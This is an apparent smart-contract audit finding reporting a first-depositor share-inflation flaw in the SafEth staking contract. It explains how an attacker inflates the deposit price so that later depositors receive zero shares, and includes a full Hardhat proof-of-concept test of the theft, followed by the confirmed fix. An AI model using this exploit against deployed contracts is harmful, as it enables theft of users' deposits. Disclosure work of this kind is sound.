[H-01] An attacker can manipulate the preDepositvePrice to steal from other users
Submitted bymonrel, also found bygiovannidisiena,d3e4,anodaram,ulqiorra,parsely,n33k,Tricko,Haipls,sinarette,nemveer,0xRajkumar,mahdirostami,0xfusion,sashik_eth,Koolex,Vagner,RedTiger,aga7hokakological,bytes032,MiloTruck,pavankv,yac,sinarette,Bahurum,ToonVH,shaka,bart1e,bart1e,juancito,mert_eren,Krace,ck,bin2chen,igingu,AkshaySrivastav,RaymondFam,Cryptor,carrotsmuggler,Dug, andBrenzee
https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98
Impact
The first user that stakes can manipulate the total supply of sfTokens and by doing so create a rounding error for each subsequent user. In the worst case, an attacker can steal all the funds of the next user.
Proof of Concept
When the first user enters totalSupply is set to 1e18 onL79:
if(totalSupply==0)preDepositPrice=10**18;// initializes with a price of 1elsepreDepositPrice= (10**18*underlyingValue) /totalSupply;
But the user can immediately unstake most of his safETH such that totalSupply <<  1e18. The attacker can then transfer increase the underlying amount by transferring derivative tokens to the derivative contracts.
For subsequent users, the preDepositPrice will be heavily inflated and the calculation of mintAmount onL98:
uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;
can be very inaccurate. In the worst case it rounds down to 0 for users that deposit value that is less than the value that the attacker transferred in.
In the following POC the attacker steals all of the second userâ€™s deposit. The attacker first deposits 100 ETH and immediately removes all but 1 wei. The attacker then transfers 10 wsETH to the WstEth contract. When the second user enters with 1.5 ETH no additional safETH are minted since the minAmount is rounded down to 0. The attacker has all of the safTokens and can withdraw 100% of deposits.
Create a new test file with the following content to run the POC.
import{SafEth}from"../typechain-types";import{ethers,upgrades,network}from"hardhat";import{expect}from"chai";import{getAdminAccount,getUserAccounts,getUserBalances,randomStakes,randomUnstakes,}from"./helpers/integrationHelpers";import{getLatestContract}from"./helpers/upgradeHelpers";import{BigNumber}from"ethers";importERC20from"@openzeppelin/contracts/build/contracts/ERC20.json";import{RETH_MAX,WSTETH_ADRESS,WSTETH_WHALE}from"./helpers/constants";describe.only("SafEth POC",function() {letsafEthContractAddress:string;letstrategyContractAddress:string;// create string arrayletderivativesAddress:string[] = [];letstartingBalances:BigNumber[];letnetworkFeesPerAccount:BigNumber[];lettotalStakedPerAccount:BigNumber[];before(async()=>{startingBalances=awaitgetUserBalances();networkFeesPerAccount=startingBalances.map(()=>BigNumber.from(0));totalStakedPerAccount=startingBalances.map(()=>BigNumber.from(0));});it("Should deploy the strategy contract",asyncfunction() {constsafEthFactory=awaitethers.getContractFactory("SafEth");conststrategy= (awaitupgrades.deployProxy(safEthFactory, ["Asymmetry Finance ETH","safETH",]))asSafEth;awaitstrategy.deployed();strategyContractAddress=strategy.address;constowner=awaitstrategy.owner();constderivativeCount=awaitstrategy.derivativeCount();expect(owner).eq((awaitgetAdminAccount()).address);expect(derivativeCount).eq("0");});it("Should deploy derivative contracts and add them to the strategy contract with equal weights",asyncfunction() {constsupportedDerivatives= ["Reth","SfrxEth","WstEth"];conststrategy=awaitgetLatestContract(strategyContractAddress,"SafEth");for(leti=0;i<supportedDerivatives.length;i++) {constderivativeFactory=awaitethers.getContractFactory(supportedDerivatives[i]);constderivative=awaitupgrades.deployProxy(derivativeFactory, [strategyContractAddress,]);constderivativeAddress=derivative.address;derivativesAddress.push(derivativeAddress);awaitderivative.deployed();consttx1=awaitstrategy.addDerivative(derivative.address,"1000000000000000000");awaittx1.wait();}constderivativeCount=awaitstrategy.derivativeCount();expect(derivativeCount).eq(supportedDerivatives.length);});it("Steal funds",asyncfunction() {conststrategy=awaitgetLatestContract(strategyContractAddress,"SafEth");constuserAccounts=awaitgetUserAccounts();lettotalStaked=BigNumber.from(0);constuserStrategySigner=strategy.connect(userAccounts[0]);constuserStrategySigner2=strategy.connect(userAccounts[1]);constethAmount="100";constdepositAmount=ethers.utils.parseEther(ethAmount);totalStaked=totalStaked.add(depositAmount);constbalanceBefore=awaituserAccounts[0].getBalance();conststakeResult=awaituserStrategySigner.stake({value:depositAmount,});constmined=awaitstakeResult.wait();constnetworkFee=mined.gasUsed.mul(mined.effectiveGasPrice);networkFeesPerAccount[0] =networkFeesPerAccount[0].add(networkFee);totalStakedPerAccount[0] =totalStakedPerAccount[0].add(depositAmount);constuserSfEthBalance=awaitstrategy.balanceOf(userAccounts[0].address);constuserSfWithdraw=userSfEthBalance.sub(1);awaitnetwork.provider.request({method:"hardhat_impersonateAccount",params:[WSTETH_WHALE],});constwhaleSigner=awaitethers.getSigner(WSTETH_WHALE);consterc20=newethers.Contract(WSTETH_ADRESS,ERC20.abi,userAccounts[0]);constwderivative=derivativesAddress[2];consterc20BalanceBefore=awaiterc20.balanceOf(wderivative);//remove all but 1 sfTokenconstunstakeResult=awaituserStrategySigner.unstake(userSfWithdraw);consterc20Whale=erc20.connect(whaleSigner);consterc20Amount=ethers.utils.parseEther("10");// transfer tokens directly to the derivative (done by attacker)awaiterc20Whale.transfer(wderivative,erc20Amount);// NEW USER ENTERSconstethAmount2="1.5";constdepositAmount2=ethers.utils.parseEther(ethAmount2);conststakeResu2lt=awaituserStrategySigner2.stake({value:depositAmount2,});constmined2=awaitstakeResult.wait();// User has 0 sfTokens!constuserSfEthBalance2=awaitstrategy.balanceOf(userAccounts[1].address);console.log("userSfEthBalance2: ",userSfEthBalance2.toString());// Attacker has 1 sfTokenconstAttakcerSfEthBalanc=awaitstrategy.balanceOf(userAccounts[0].address);console.log("AttakcerSfEthBalanc: ",AttakcerSfEthBalanc.toString());//Total supply is 1.consttotalSupply=awaitstrategy.totalSupply();console.log("totalSupply: ",totalSupply.toString());});});
Tools Used
vscode, hardhat
Asymmetry mitigated:
Use internal accounting to get the balance.
Status:Mitigation confirmed with comments. Full details in reports fromd3e4,adriro, and0x52.